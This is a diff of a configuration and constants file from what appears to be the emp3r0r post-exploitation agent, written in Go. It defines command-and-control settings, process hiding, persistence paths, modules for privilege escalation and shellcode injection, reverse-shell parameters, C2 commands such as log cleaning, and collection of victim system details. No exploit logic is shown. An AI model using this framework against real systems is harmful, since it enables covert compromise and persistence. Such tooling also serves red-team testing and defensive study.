@@ -11,17 +11,11 @@ import (
 )
 
 var (
-	// CCAddress how our agent finds its CC
-	CCAddress = "https://[cc_ipaddr]"
-
-	// CCIP IP address of CC
-	CCIP = ""
+	// MagicString as separator/password
+	MagicString = "c44ccf2a-c651-4cec-9f32-1ff9621b5518"
 
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
 	Transport = "HTTP2"
-
-	// AESKey generated from Tag -> md5sum, type: []byte
-	AESKey = genAESKey("Your Pre Shared AES Key: " + OpSep)
 
 	// HTTPClient handles agent's http communication
 	HTTPClient *http.Client
@@ -29,20 +23,11 @@ var (
 	// H2Json the connection to CC, for JSON message-based communication
 	H2Json *h2conn.Conn
 
+	// KCPKeep: when disconnected from C2, KCP client should be notified
+	KCPKeep = true
+
 	// ProxyServer Socks5 proxy listening on agent
 	ProxyServer *socks5.Server
-
-	// AgentProxy used by this agent to communicate with CC server
-	AgentProxy = ""
-
-	// DoHServer DNS over HTTPS server for global name resolving
-	DoHServer = ""
-
-	// CDNProxy websocket address of the C2 behind CDN
-	CDNProxy = ""
-
-	// SocketName name of our unix socket
-	SocketName = AgentRoot + "/.socket"
 
 	// HIDE_PIDS all the processes
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
@@ -53,67 +38,19 @@ var (
 	// GuardianAgentPath where the agent binary is stored
 	GuardianAgentPath = "[persistence_agent_path]"
 
-	// Version record version on build time
-	Version = "[version_string]"
+	// will be updated by ReadJSONConfig
+	CCAddress    = ""
+	LibPath      = ""
+	DefaultShell = ""
 
-	// AgentRoot root directory
-	AgentRoot = "[agent_root]"
-
-	// UtilsPath binary path of utilities
-	UtilsPath = AgentRoot + "/bin"
-
-	// DefaultShell the shell to use, use static bash binary when possible
-	DefaultShell = UtilsPath + "/bash"
-
-	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
-	Libemp3r0rFile = UtilsPath + "/libe.so"
-
-	// PIDFile stores agent PID
-	PIDFile = AgentRoot + "/.pid"
-
-	// CCPort port of c2
-	CCPort = "[cc_port]"
-
-	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
-	ProxyPort = "[proxy_port]"
-
-	// SSHDPort port of sshd
-	SSHDPort = "[sshd_port]"
-
-	// ReverseProxyPort for reverse proxy
-	ReverseProxyPort = ""
-
-	// BroadcastPort port of broadcast server
-	BroadcastPort = "[broadcast_port]"
-
-	// BroadcastIntervalMin broadcast wait seconds
-	BroadcastIntervalMin = 30
-
-	// BroadcastIntervalMax broadcast wait seconds
-	BroadcastIntervalMax = 120
-
-	// CCIndicator check this before trying connection
-	CCIndicator = "[cc_indicator]"
-
-	// CCIndicatorText content of your indicator file
-	CCIndicatorText = "[indicator_text]"
-
-	// IndicatorWaitMin cc indicator wait seconds
-	IndicatorWaitMin = 30
-
-	// IndicatorWaitMax cc indicator wait seconds
-	IndicatorWaitMax = 120
-
-	// AgentUUID uuid of this agent
-	AgentUUID = "[agent_uuid]"
-
-	// AgenTag tag of this agent
-	AgentTag = ""
+	// AESKey generated from Tag -> md5sum, type: []byte
+	AESKey []byte
 )
 
 const (
-	// OpSep separator of CC payload
-	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"
+	// Version hardcoded version string
+	// see https://github.com/googleapis/release-please/blob/f398bdffdae69772c61a82cd7158cca3478c2110/src/updaters/generic.ts#L30
+	Version = "v1.22.3" // x-release-please-version
 
 	// RShellBufSize buffer size of reverse shell stream
 	RShellBufSize = 128
@@ -139,7 +76,6 @@ const (
 	ModGET_ROOT     = "get_root"
 	ModREVERSEPROXY = "reverse_proxy"
 	ModGDB          = "gdbserver"
-	ModBettercap    = "bettercap"
 )
 
 // PersistMethods CC calls one of these methods to get persistence, or all of them at once
@@ -165,7 +101,6 @@ var ModuleComments = map[string]string{
 	ModINJECTOR:     "Inject shellcode/loader.so into a running process",
 	ModGET_ROOT:     "Try some built-in LPE exploits",
 	ModREVERSEPROXY: "Manually proxy agents who are unable to use our forward proxy",
-	ModBettercap:    "Remote bettercap, offered as an interactive shell",
 	ModGDB:          "Remote gdbserver, debug anything",
 }
 
@@ -202,33 +137,30 @@ var ModuleHelp = map[string]map[string]string{
 	ModREVERSEPROXY: {
 		"addr": "Target host to proxy, we will connect to it and proxy it out",
 	},
-	ModBettercap: {
-		"args": "Command line args for bettercap",
-	},
 }
 
-// Config build.json config file
-type Config struct {
-	Version              string `json:"version"`                // agent version
-	CCPort               string `json:"cc_port"`                // "cc_port": "5381",
-	ProxyPort            string `json:"proxy_port"`             // "proxy_port": "56238",
-	SSHDPort             string `json:"sshd_port"`              // "sshd_port": "2222",
-	BroadcastPort        string `json:"broadcast_port"`         // "broadcast_port": "58485",
-	BroadcastIntervalMin int    `json:"broadcast_interval_min"` // "broadcast_interval_min": 60, // seconds, set max to 0 to disable
-	BroadcastIntervalMax int    `json:"broadcast_interval_max"` // "broadcast_interval_max": 120, // seconds, set max to 0 to disable
-	CCIP                 string `json:"ccip"`                   // "ccip": "192.168.40.137",
-	AgentRoot            string `json:"agent_root"`             // "agent_root": "/dev/shm/.848ba",
-	PIDFile              string `json:"pid_file"`               // "pid_file": ".848ba.pid",
-	CCIndicator          string `json:"cc_indicator"`           // "cc_indicator": "cc_indicator",
-	IndicatorWaitMin     int    `json:"indicator_wait_min"`     // "indicator_wait_min": 60, // seconds
-	IndicatorWaitMax     int    `json:"indicator_wait_max"`     // "indicator_wait_max": 120, // seconds, set max to 0 to disable
-	CCIndicatorText      string `json:"indicator_text"`         // "indicator_text": "myawesometext"
-	CA                   string `json:"ca"`                     // CA cert from server side
-}
+// C2Commands
+const (
+	C2CmdCleanLog      = "!clean_log"
+	C2CmdUpdateAgent   = "!upgrade_agent"
+	C2CmdGetRoot       = "!get_root"
+	C2CmdPersistence   = "!persistence"
+	C2CmdCustomModule  = "!custom_module"
+	C2CmdInject        = "!inject"
+	C2CmdUtils         = "!utils"
+	C2CmdDeletePortFwd = "!delete_portfwd"
+	C2CmdPortFwd       = "!port_fwd"
+	C2CmdProxy         = "!proxy"
+	C2CmdSSHD          = "!sshd"
+	C2CmdLPE           = "!lpe"
+	C2CmdReverseProxy  = "!" + ModREVERSEPROXY
+	C2CmdStat          = "!stat"
+)
 
-// SystemInfo agent properties
-type SystemInfo struct {
+// AgentSystemInfo agent properties
+type AgentSystemInfo struct {
 	Tag         string        `json:"Tag"`         // identifier of the agent
+	Name        string        `json:"Name"`        // short name of the agent
 	Version     string        `json:"Version"`     // agent version
 	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
 	Hostname    string        `json:"Hostname"`    // Hostname and machine ID
@@ -238,9 +170,10 @@ type SystemInfo struct {
 	GPU         string        `json:"GPU"`         // GPU info
 	Mem         string        `json:"Mem"`         // memory size
 	OS          string        `json:"OS"`          // OS name and version
+	GOOS        string        `json:"GOOS"`        // runtime.GOOS
 	Kernel      string        `json:"Kernel"`      // kernel release
 	Arch        string        `json:"Arch"`        // kernel architecture
-	IP          string        `json:"IP"`          // public IP of the target
+	From        string        `json:"From"`        // where the agent is coming from, usually a public IP, or 127.0.0.1
 	IPs         []string      `json:"IPs"`         // IPs that are found on target's NICs
 	ARP         []string      `json:"ARP"`         // ARP table
 	User        string        `json:"User"`        // user account info
@@ -248,6 +181,7 @@ type SystemInfo struct {
 	HasTor      bool          `json:"HasTor"`      // is agent from Tor?
 	HasInternet bool          `json:"HasInternet"` // has internet access?
 	Process     *AgentProcess `json:"Process"`     // agent's process
+	Exes        []string      `json:"Exes"`        // executables found in agent's $PATH
 }
 
 // AgentProcess process info of our agent
